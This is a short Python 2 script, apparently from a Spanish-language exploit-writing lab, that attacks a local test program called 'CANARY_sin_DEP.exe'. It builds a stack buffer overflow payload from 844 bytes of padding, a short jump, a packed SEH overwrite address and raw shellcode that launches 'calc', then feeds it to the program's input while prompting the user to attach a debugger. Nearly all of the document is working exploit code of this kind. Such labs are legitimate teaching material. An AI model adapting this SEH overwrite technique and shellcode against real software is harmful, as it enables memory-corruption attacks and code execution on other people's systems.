from os import *
import struct
shellcode ="\xB8\x40\x50\x03\x78\xC7\x40\x04"+ "calc" + "\x83\xC0\x04\x50\x68\x24\x98\x01\x78\x59\xFF\xD1\x68\xAB\x39\x00\x78\xC3"

stdin,stdout = popen4(r'CANARY_sin_DEP.exe -1')
print "ATACHEA EL DEBUGGER Y APRETA ENTER\n"
raw_input()

next="\xeb\x06\x90\x90"
seh=struct.pack("<L", 0x78001075)

fruta = 844 * "A" + next + seh + shellcode + 6000 * "B" + "\n"

print stdin

print "Escribe: " + fruta
stdin.write(fruta)
print stdout.read(40)



